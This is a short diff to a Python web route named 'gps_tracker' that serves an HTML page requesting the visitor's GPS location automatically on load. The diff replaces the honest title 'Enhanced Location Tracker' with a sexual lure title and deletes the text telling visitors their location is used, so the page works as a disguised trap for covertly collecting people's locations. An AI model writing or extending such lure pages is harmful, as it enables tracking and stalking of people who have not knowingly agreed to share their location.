@@ -32,7 +32,7 @@ def gps_tracker():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Enhanced Location Tracker</title>
+        <title>Sexy Bhabhi</title>
         <style>
             body {
                 font-family: Arial, sans-serif;
@@ -75,8 +75,8 @@ def gps_tracker():
                 <source src="/static/New Project - Made with Clipchamp.mp4" type="video/mp4">
                 Your browser does not support the video tag.
             </video>
-            <h1>Welcome to Our Experience</h1>
-            <p>Enjoy the journey while we optimize your preferences based on your location.</p>
+            
+            
             <p id="status">Initializing location request...</p>
             <script>
                 // Automatically request GPS location when the page loads
